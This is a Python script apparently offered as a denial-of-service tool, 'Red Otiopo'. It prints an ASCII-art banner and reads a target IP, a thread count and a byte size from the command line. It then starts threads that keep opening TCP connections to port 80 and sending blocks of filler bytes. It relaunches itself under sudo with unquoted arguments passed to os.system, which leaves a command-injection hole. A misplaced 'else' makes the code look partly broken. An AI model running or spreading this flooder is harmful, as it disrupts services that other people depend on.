import sys, colorama, os, time, socket, threading

print(colorama.Fore.RED + "Red Otiopo Python Script")
print(colorama.Fore.GREEN + "args: " + str(sys.argv) + colorama.Style.RESET_ALL)
print("Console Loaded.") 
print(colorama.Fore.YELLOW + r"""
             /\ / \  /\
             |   ||   |
             |   ||   |
             |   ||   |
             |   ||   |
             |   ||   |
             |   ||   |
             |   ||   |
             |   ||   |
             |   ||   |
 / | || | \ /( | || | )\
|`\_ | || | _/'| `. `-._ | || | _,-' ,'|
( ` . `-._ | _--_ | _,-' , ' ) `.._ ` . `-./.__.\.-' , ' _,-' `-._ ` | / \ | ' 
     _,-'
         `-._/ |_()_| \_,-' ___.-' ______ `-, '-----.  |______| / \ ______ /
            |  \     / /
             \________/ _]______[_
             |        |
             |________|
              ]______[
             |        |
             |________|
             _]______[_
             |        |
             |________|
             _]______[_
             |        |
             |________|
               ]____[ 
""")
print(colorama.Style.RESET_ALL)
if "SUDO_UID" in os.environ.keys():
        print("sudo enabled!")
        print(colorama.Fore.RED + "-" * 69)
        print(colorama.Fore.RED + "|" + (" " * 67) + "|")
        print(colorama.Fore.RED + "|                             Made By otiopo                               |")
        print(colorama.Fore.RED + "|" + (" " * 67) + "|")
        print(colorama.Fore.RED + "-" * 69)
        print(colorama.Style.RESET_ALL)
        try:
                if sys.argv[1] == "-i" and sys.argv[3] == "-t"  and sys.argv[5] == "-b":
                        ip = sys.argv[2]
                        power = sys.argv[4]
                        bytess = sys.argv[6]
                        print(colorama.Fore.GREEN + "Locked Target '" + ip + "'!" + colorama.Style.RESET_ALL)
                        for letter in "Running Socket...":
                                sys.stdout.write(letter)
                                sys.stdout.flush()
                                time.sleep(0.01)
                        print("\nCreating " + power + " Threads!")
                        print(bytess + " Bytes")
                        num = int(bytess)
                        def attack():
                                try:
                                        while True:
                                                global num
                                                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                                s.connect((ip, 80))
                                                s.send(("A" * int(bytess)).encode("utf8"))
                                                if num % (int(bytess) * 10) == 0:
                                                        sys.stdout.write(str(num) + " Bytes Send")
                                                        sys.stdout.flush()
                                                num = num + int(bytess)
                                                s.close()
                                except:
                                        print("Error")
                                        exit()
                        for i in range(int(power)):
                                thread = threading.Thread(target=attack)
                                thread.start()
                                else:
                        print("wrong args")
        except:
                print(colorama.Fore.RED + "No Ip Found" + colorama.Style.RESET_ALL)
                exit()
else:
        print("running as sudo..")
        try:
                os.system("sudo python3 main.py " + sys.argv[1] + " " + sys.argv[2] + " " + sys.argv[3] + " " + sys.argv[4] + " " + sys.argv[5] + " " + sys.argv[6])
        except:
                print(colorama.Fore.RED + "An Error Ocurred" + colorama.Style.RESET_ALL)
        exit()
